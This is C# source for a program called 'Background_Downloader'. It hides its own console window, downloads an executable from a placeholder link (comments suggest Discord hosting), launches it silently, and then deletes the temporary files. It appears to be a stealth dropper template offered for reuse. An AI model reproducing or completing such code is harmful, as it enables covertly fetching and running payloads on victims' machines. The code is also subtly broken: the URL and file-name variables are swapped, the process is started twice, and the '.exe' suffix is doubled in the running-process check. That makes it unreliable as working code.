using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Net;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace Background_Downloader
{
    class Program
    {
        // Import DLL 
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();


        // Import an other dll to hide the console window
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static AsyncCompletedEventHandler Completed { get; private set; }
        public static string processes = string.Empty;
        static void Main(string[] args)
        {

            // Strings 
            string name = "" + ".exe"; // Yourprogram name
            string name_link = ""; // your program download link (you can use discord)

            // Console title 
            Console.Title = Guid.NewGuid().ToString();
            // hide the console for user
            var handler = GetConsoleWindow();
            ShowWindow(handler, 0);
            // Creating Tempfile
            string temp = @"C:\temp\" + Guid.NewGuid();
            Directory.CreateDirectory(temp);
            string grapped = temp + $"\\{name_link}.exe";
            // Trying to install.
            try
            {
                // download your file.
                WebClient webClient = new WebClient();
                // If file downloaded and is completed downloaded goto to Completed
                webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(Completed);
                // download progress
                webClient.DownloadProgressChanged += new DownloadProgressChangedEventHandler(ProgressChanged);
                // Download the file
                webClient.DownloadFileAsync(new Uri($"{name}"), grapped);
            }
            // If it there is an error with downloading file.
            catch
            {
                Environment.Exit(1);
            }
            // If you want to change this you can change this. 
            void ProgressChanged(object sender, DownloadProgressChangedEventArgs e)
            {

            }
            // if its Completed..
            void Completed(object sender, AsyncCompletedEventArgs e)
            {
                // set var for process
                var p = Process.Start(grapped);
                // if it done
                p.Start();
                  
            }
            // checks if the program is running
            if (Process.GetProcessesByName($"{name}.exe").Length > 0)
            {          }
            // If its not running then do this
            else
            {
                Thread.Sleep(10000);
                // try to remove your files
                try
                {
                    File.Delete(grapped);
                    Directory.Delete(temp);
                }
                // if there is an error
                catch
                { }
                Environment.Exit(1);
            }

        }

    }

}
